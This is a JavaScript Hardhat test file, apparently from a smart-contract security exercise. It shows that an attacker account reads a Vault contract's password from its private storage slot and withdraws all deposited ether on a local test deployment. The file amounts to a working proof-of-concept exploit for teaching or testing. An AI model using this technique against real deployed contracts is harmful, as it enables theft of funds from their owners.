const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Vault", function () {
  let deployer, attacker;

  beforeEach(async function () {
    [deployer, attacker] = await ethers.getSigners();

    const Vault = await ethers.getContractFactory("Vault", deployer);
    this.vault = await Vault.deploy(ethers.utils.formatBytes32String("vault@123"));

    await this.vault.deposit({ value: ethers.utils.parseEther("100") });
  });

  it("Should be possible for attacker to retrieve password and withdraw funds", async function () {
    const initialBalanceContract = await ethers.provider.getBalance(this.vault.address);
    const initialBalanceAttacker = await ethers.provider.getBalance(attacker.address);

    console.log("Contract's initial balance: ", ethers.utils.formatEther(initialBalanceContract.toString()));
    console.log("Attacker's initial balance: ", ethers.utils.formatEther(initialBalanceAttacker.toString()));

    const pass = await ethers.provider.getStorageAt(this.vault.address, 1);

    const password = await ethers.utils.parseBytes32String(pass);

    console.log("--------------------------------");
    console.log("Password retrieved from storage: " + password);
    console.log("--------------------------------");

    await this.vault.connect(attacker).withdraw(pass);

    const finalBalanceContract = await ethers.provider.getBalance(this.vault.address);
    const finalBalanceAttacker = await ethers.provider.getBalance(attacker.address);

    console.log("Contract's final balance: ", ethers.utils.formatEther(finalBalanceContract.toString()));
    console.log("Attacker's final balance: ", ethers.utils.formatEther(finalBalanceAttacker.toString()));

    expect(finalBalanceContract).to.eq(0);
    expect(finalBalanceAttacker).to.be.gt(initialBalanceAttacker);
  });
});